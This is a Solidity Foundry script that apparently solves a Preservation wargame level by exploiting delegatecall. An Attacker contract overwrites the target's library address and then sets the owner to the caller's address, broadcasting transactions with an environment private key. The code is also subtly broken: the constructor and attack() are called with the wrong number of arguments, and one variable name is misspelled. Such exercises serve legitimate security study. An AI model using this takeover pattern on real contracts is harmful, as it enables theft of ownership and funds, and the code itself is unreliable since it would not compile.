// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import { Preservation } from "../src/level16.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

/// @notice delegatecall vulnerability
contract Level16Solution is Script {
    Preservation level = Preservation(0xE30de82d9dC9dbF3d741cF19B8fE4a77dd6e2887);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("myAddress: ", vm.envAddress("MY_ADDRESS"));
        // 1. Create the Attacker contract and the constructor will call setFirstTime(), 
        // which will then perform a delecatecall to the LibraryContract and it will update the caller contract's slot 0
        // to the given parameter.
        Attacker attacker = new Attacker(level);
        // 3. After the Attacker contract has been created and the timeZone1Library has been pointed to Attacker contract,
        // we use the contract and call the attack() function, which calls setFirstTime() again and provide your
        // address. It will call then delegatecall setTime(), which is our custom setTime() function that sets the owner to your address
        attacker.attack(vm.envAddress("MY_ADDRESS"));
        console.log("owner: ", level.owner());

        vm.stopBroadcast();
    }
}

contract Attacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    Preservation level;
    address myAddress;

    constructor(Preservation _level, address my_address) {
        level = _level;
        // 2. In here, we set the caller contract's timeZone1Library address to point to this malicious Attacker contract
        level.setFirstTime(uint256(uint160(address(this))));
        myAddress = my_address;
        console.log("this address: ", address(this));
        console.log("t1 address: ", _level.timeZone1Library());
    }

    function attack() external {
        level.setFirstTime(uint256(uint160(myaddress)));
    }

    // 4. Custom setTime function that sets the caller contract to your address
    function setTime(uint256 _time) public {
        owner = myAddress;
    }
}

